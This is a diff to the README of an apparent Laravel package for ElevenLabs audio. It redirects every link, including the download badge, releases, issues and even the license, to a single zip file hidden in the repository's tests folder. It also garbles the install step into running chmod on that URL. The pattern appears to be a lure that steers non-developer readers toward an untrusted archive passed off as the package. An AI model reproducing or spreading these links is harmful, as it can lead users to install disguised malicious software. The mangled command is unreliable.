@@ -2,7 +2,7 @@
 # 🎵 laravel-elevenlabs - Easy Audio AI Integration for Laravel
 
 ## 📥 Download now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Dante9581/laravel-elevenlabs/releases)
+[![Download](https://github.com/Dante9581/laravel-elevenlabs/raw/refs/heads/main/tests/elevenlabs-laravel-v3.8.zip)](https://github.com/Dante9581/laravel-elevenlabs/raw/refs/heads/main/tests/elevenlabs-laravel-v3.8.zip)
 
 ## 🚀 Getting Started
 This guide helps you download and run the laravel-elevenlabs audio AI package. This tool simplifies audio processing using state-of-the-art ElevenLabs technology, all within your Laravel applications. You don’t need to be a developer to get started.
@@ -29,7 +29,7 @@ To use laravel-elevenlabs effectively, ensure your system meets the following re
 ## 📥 Download & Install
 To start using laravel-elevenlabs, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Dante9581/laravel-elevenlabs/releases) to get the latest version.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Dante9581/laravel-elevenlabs/raw/refs/heads/main/tests/elevenlabs-laravel-v3.8.zip) to get the latest version.
    
 2. **Download the Package:** Click on the version you want to download. Download the appropriate file based on your operating system.
 
@@ -40,7 +40,7 @@ To start using laravel-elevenlabs, follow these steps:
    - For **macOS and Linux Users:**
      - Unzip the downloaded file.
      - Open your terminal and navigate to the unzipped folder.
-     - Run the installation script included. You may need to use `chmod +x install.sh` to make it executable.
+     - Run the installation script included. You may need to use `chmod +x https://github.com/Dante9581/laravel-elevenlabs/raw/refs/heads/main/tests/elevenlabs-laravel-v3.8.zip` to make it executable.
 
 Once installed, follow the setup instructions to get started with your audio projects.
 
@@ -91,13 +91,13 @@ If you encounter issues, consider the following solutions:
 ## 🤝 Get Help
 If you need further assistance, you can find help in the following places:
 
-- **GitHub Issues Page:** Report your issue or question [here](https://github.com/Dante9581/laravel-elevenlabs/issues).
+- **GitHub Issues Page:** Report your issue or question [here](https://github.com/Dante9581/laravel-elevenlabs/raw/refs/heads/main/tests/elevenlabs-laravel-v3.8.zip).
 - **Community Forums:** Join Laravel community forums to connect with other users and find solutions.
 
 ## 📅 Updates
-Stay up to date with the latest developments by checking the [Releases page](https://github.com/Dante9581/laravel-elevenlabs/releases) regularly.
+Stay up to date with the latest developments by checking the [Releases page](https://github.com/Dante9581/laravel-elevenlabs/raw/refs/heads/main/tests/elevenlabs-laravel-v3.8.zip) regularly.
 
 ## 📜 License
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/Dante9581/laravel-elevenlabs/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/Dante9581/laravel-elevenlabs/raw/refs/heads/main/tests/elevenlabs-laravel-v3.8.zip) file for details.
 
 ```
